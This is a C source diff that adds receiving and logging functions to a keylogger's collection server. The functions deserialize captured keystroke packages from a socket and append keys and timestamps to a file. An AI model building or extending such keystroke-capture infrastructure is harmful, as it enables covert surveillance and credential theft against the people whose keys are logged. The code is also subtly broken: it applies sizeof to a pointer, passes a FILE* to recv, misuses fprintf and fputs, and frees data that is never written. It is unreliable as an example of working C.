@@ -13,6 +13,7 @@
 #include <string.h>
 #include <unistd.h>
 
+#include "keylogger.h"
 #include "server_utils.h"
 
 keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog) {
@@ -101,5 +102,44 @@ void process_keylog_info(int socket_descriptor) {
   }
   if (fclose(client_file) == EOF) {
     error_and_exit("Couldn't close client socket descriptor");
+  }
+}
+
+int deserialize(FILE* socket_file, key_package* package) {
+  // Receive serialized data from socket
+  size_t package_size = sizeof(package);
+  char* serialized_data = malloc(package_size);
+  int received = recv(socket_file, serialized_data, package_size, 0);
+
+  if (received == -1) {
+    fprintf(stderr, "Error receiving data: %ld\n");
+    free(serialized_data);
+    return -1;
+  }
+
+  package = malloc(sizeof(key_package));
+
+  // Deserialize key_package
+  memcpy(package, serialized_data, package_size);
+
+  // insert file writing function here
+
+  free(serialized_data);
+  free(package);
+
+  return received;
+}
+
+void key_package_to_file(key_package* package) {
+  FILE* package_log = fopen("package.txt", "a");
+  if (package_log == NULL) {
+    error_and_exit("Couldn't open file");
+  }
+
+  char* line = "";
+  for (size_t i = 0; i < package->keys_arr_size; i++) {
+    fputs(("Key: %s, \t Timestamp: %s", package->keys[i].key,
+           package->keys[i].timestamp),
+          package_log);
   }
 }
